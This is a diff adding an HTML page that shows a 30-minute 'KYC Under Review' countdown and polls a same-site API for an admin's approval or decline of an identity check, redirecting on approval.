@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KYC Under Review</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+<style>
+body{
+  background:#0d0d0d;
+  color:white;
+  font-family:Poppins, sans-serif;
+  text-align:center;
+  padding-top:80px;
+}
+h1{color:gold;font-size:40px;margin-bottom:10px;}
+#timer{
+  font-size:50px;
+  margin:20px 0;
+  color:gold;
+}
+.status{
+  margin-top:20px;
+  font-size:18px;
+  color:#ccc;
+}
+.btn{
+  margin-top:30px;
+  padding:15px 30px;
+  background:gold;
+  border:none;
+  border-radius:10px;
+  font-weight:bold;
+  cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<h1>🟡 KYC Under Review</h1>
+<p>Admin is reviewing your identity verification</p>
+
+<div id="timer">30:00</div>
+<div class="status" id="statusText">Waiting for admin approval...</div>
+
+<button class="btn" onclick="checkStatus()">Check Status</button>
+
+<script>
+// ===== 30 MIN COUNTDOWN =====
+let time = 1800; // 30 minutes
+
+const timerInterval = setInterval(()=>{
+  let minutes = Math.floor(time/60);
+  let seconds = time % 60;
+
+  document.getElementById("timer").innerHTML =
+    `${minutes}:${seconds<10?'0'+seconds:seconds}`;
+
+  time--;
+
+  if(time < 0){
+    clearInterval(timerInterval);
+    document.getElementById("statusText").innerText = "⏰ Time expired. Contact support.";
+  }
+},1000);
+
+// ===== USER OTP ID (replace with dynamic server-provided value) =====
+const otpId = "{{otpId}}"; // backend should render this dynamically
+
+// ===== POLLING ADMIN RESPONSE =====
+let pollingInterval;
+function startPolling() {
+  pollingInterval = setInterval(()=>{
+    fetch(`/api/kyc/status/${otpId}`)
+    .then(res => res.json())
+    .then(data => {
+      if(data.status === "approved"){
+        clearInterval(pollingInterval);
+        document.getElementById("statusText").innerHTML = "✅ KYC Approved! Redirecting...";
+        setTimeout(()=> window.location.href="/kyc-final.html",2000);
+      } else if(data.status === "declined"){
+        clearInterval(pollingInterval);
+        document.getElementById("statusText").innerHTML = "❌ KYC Declined. Contact support.";
+      }
+    }).catch(err => console.error(err));
+  },3000); // every 3 seconds
+}
+
+startPolling();
+
+// ===== MANUAL CHECK BUTTON =====
+function checkStatus(){
+  fetch(`/api/kyc/status/${otpId}`)
+  .then(res => res.json())
+  .then(data => {
+    if(data.status === "pending"){
+      alert("Admin still reviewing your KYC... please wait.");
+    } else if(data.status === "approved"){
+      alert("✅ KYC Approved! Redirecting...");
+      window.location.href="/kyc-final.html";
+    } else if(data.status === "declined"){
+      alert("❌ KYC Declined. Contact support.");
+    }
+  });
+}
+</script>
+
+</body>
+</html>
